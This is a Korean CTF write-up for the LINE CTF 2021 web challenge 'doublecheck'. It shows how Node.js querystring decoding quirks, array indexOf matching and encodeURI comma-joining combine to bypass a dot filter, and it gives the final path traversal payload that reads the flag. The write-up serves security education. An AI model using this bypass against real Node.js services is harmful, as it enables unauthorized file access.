---
title: ["[LINE CTF 2021 - web] doublecheck"]
date: 2025-01-06 09:00:00 +0900
categories: [writeup, ctf]
tags: [web, node, querystring, path traversal]
---

```javascript
app.post('/', function (req, res, next) {
  const body = req.body
  if (typeof body !== 'string') return next(createError(400))

  if (validate(body)) return next(createError(403))
  const { p } = querystring.parse(body)
  if (validate(p)) return next(createError(403))

  try {
    http.get(`http://localhost:${port}/api/vote/` + encodeURI(p), r => {
    // ...
}

// ...

function validate (str) {
  return str.indexOf('.') > -1 || str.indexOf('%2e') > -1 || str.indexOf('%2E') > -1
}
```

취약점이 발생하는 코드의 핵심 부분이다.  
문제의 목표는 `querystring.parse()`를 하기 전과 후 모두 `validate()`함수를 통과해야 하며,  
`encodeURI(p)`의 값이 `../../../flag`가 되어야 한다.  

## QueryString 모듈의 디코딩 과정
```
입력 → querystring.parse()
→ querystring.unescape (기본값)
   → decodeURIComponent 시도
      → 실패하면 unescapeBuffer로 fallback
         → uint8 Buffer로 처리
```

### unescapeBuffer 동작방식
```
// 정상적인 동작방식
querystring.parse('p=\uac2e')  // 갮

// unescapeBuffer 동작방식
querystring.parse('p=%ff\uac2e') // �. (Buffer 처리 후, 마지막 바이트인 '2e'만 남음)
```

## indexOf 함수의 취약점
```
['../', '../../'].indexOf('.') // -1
```

배열에 대한 indexOf는 정확히 일치하는 요소를 찾으므로, `.`을 포함하는 값은 찾지 않는다.  

## querystring.parse의 동작방식
`foo=bar&abc=xyz&abc=123`는 아래와 같이 파싱된다.
```
{
  foo: 'bar',
  abc: ['xyz', '123']
}
```

## 페이로드 구성
위의 방법을 모두 조합하여 최종 페이로드를 구성할 수 있다.  

`p=1&p=%ff/갮갮/갮갮/갮갮/flag`를 인자로 준다면 아래와 같이 동작한다.

```
1. 첫번째 validate 함수 통과 (직접적인 '.' 없음)
2. querystring.parse 처리
    → decodeURICompenent 에러
    → unescapeBuffer로 fallback
    → uint8 처리로 2e 반환
    ['1', '%ff/갮갮/갮갮/갮갮/flag'] → ['1', '%ff/../../../flag']
3. 두번째 validate 함수는 배열에서 '.' 요소를 찾을 수 없어서 통과
4. encodeURI에서 인자로 배열이 들어가면 반점으로 구분한다.
    1,%ff/../../../flag
```